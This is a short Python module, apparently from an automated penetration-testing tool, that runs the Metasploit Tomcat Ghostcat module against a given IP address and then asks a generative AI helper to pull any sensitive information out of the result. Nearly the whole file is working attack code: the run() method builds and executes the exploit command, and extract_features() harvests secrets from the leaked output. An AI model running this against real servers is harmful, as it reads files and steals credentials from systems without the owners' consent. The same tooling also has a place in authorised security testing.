from .util import run_command
from .generative import GenAi
import ast
class ghostcat:
    def __init__(self, ip):
        self.ip = ip
        self.genai=GenAi()
        self.ghostcat_output=[]
    def extract_features(self,data):
        query="Return a dictionary containing any sensitive information else return an empty dictionary"
        return_format="{'data':'sensitive info'}"
        soln=self.genai.get(query,return_format,data)
        soln=ast.literal_eval(soln)
        if len(soln)>0:
            self.ghostcat_output=soln
            return True
        else:
            return False
    def run(self):
        cmd = f"msfconsole -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS {self.ip}; run; exit'"
        result = run_command(cmd)
        print(result)
        # Scrape output for knownn vulnerabilities
        output = result['output']
        print(output)
        return output
